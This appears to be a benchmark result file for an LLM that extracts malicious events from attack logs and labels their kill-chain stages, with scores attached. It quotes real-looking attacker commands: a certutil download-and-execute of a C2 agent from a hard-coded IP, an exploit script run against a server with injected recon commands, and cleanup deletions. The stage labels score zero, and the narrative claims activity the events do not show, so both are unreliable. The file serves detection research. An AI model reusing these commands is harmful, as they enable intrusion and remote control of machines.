@@ -1,0 +1,122 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Windows\\ywm.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "CertUtil.exe -HashFile C:\\Windows\\ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo [S]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q ywm.exe",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attacker has exploited several vulnerabilities using Python scripts hosted on remote servers, allowing them to gain initial access to the vulnerable machine. They have also used various techniques like URL cache manipulation, registry modification, and host exploitation to escalate their privileges, execute arbitrary code, and gather sensitive information. The final goal appears to be establishing persistence through modifying system settings, creating backdoors, and executing malicious activities such as credential theft and lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67644,
+      "completion_tokens": 2278,
+      "total_tokens": 69922,
+      "wall_clock_s": 14.954,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.4444444444444444,
+      "recall": 0.6666666666666666,
+      "f1": 0.5333333333333333,
+      "tp": 8,
+      "fp": 10,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 18,
+      "fn": 6,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.09090909090909091,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67644,
+      "completion_tokens": 2278,
+      "total_tokens": 69922,
+      "wall_clock_s": 14.954,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
